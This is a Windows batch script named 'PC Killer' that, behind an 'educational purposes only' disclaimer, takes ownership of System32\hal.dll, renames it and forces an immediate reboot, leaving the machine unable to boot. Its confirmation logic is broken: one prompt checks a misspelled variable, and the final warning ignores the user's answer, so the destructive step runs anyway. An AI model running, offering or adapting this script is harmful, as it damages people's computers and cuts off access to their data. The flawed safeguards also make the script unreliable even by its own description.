@echo off
title PC Killer
setlocal
echo Please run this batch file as an administrator.
echo.
echo READ DISCLAIMER ^-^-^> THIS IS FOR EDUCATIONAL PURPOSES ONLY! DO NOT USE THIS ON SOMEONE ELSES PC WITHOUT THEIR EXPLICIT PERMISSION! CONTINUE AT YOUR OWN RISK! WE HOLD NO RESPONSIBILITY FOR PC DAMAGE, LOSS OF DATA, AND/OR ANYTHING ELSE, EVEN IF THE INSTRUCTIONS ARE WRONG, AND/OR MISSING, AND/OR THIS BATCH FILE DOES SOMETHING ELSE OTHER THAN WE INTENDED!

:Disclaimer
echo.
set /p Disclaimer="Do you agree to the Disclaimer? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto :Fix
if /i "%Disclaimer%"=="No" goto :Close
echo Invalid Syntax!
goto :Disclaimer

:Fix
echo.
set /p Fix="To fix the computer boot into WinRE, Navigate to %WINDIR% and rename hal1.dll hal.dll. You can then boot up the PC and navigate to %WINDIR%\System32\hal.dll delete %USERNAME% permissions and change owner to NT Service\TrustedInstaller. Do you know how to do this? (Yes/No) "
if /i "%Fixr%"=="Yes" goto :Warning
if /i "%Fix%"=="No" goto :Close
echo Invalid Syntax!
goto :Fix

:Warning
echo.
set /p Warning="READ WARNING ^-^-^> THERE IS NO GOING BACK AFTER THIS! THIS IS YOUR LAST CHANCE TO STOP! ARE YOU SURE YOU WANT TO CONTINUE? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto :Kill
if /i "%Disclaimer%"=="No" goto :Close
echo Invalid Syntax!
goto :Warning

:Kill
endlocal
cd "%windir%\System32"
takeown /f hal.dll 
icacls hal.dll /grant %USERNAME%:(d,wdac)
ren hal.dll hal1.dll
Shutdown /r /t 00

:Close
endlocal
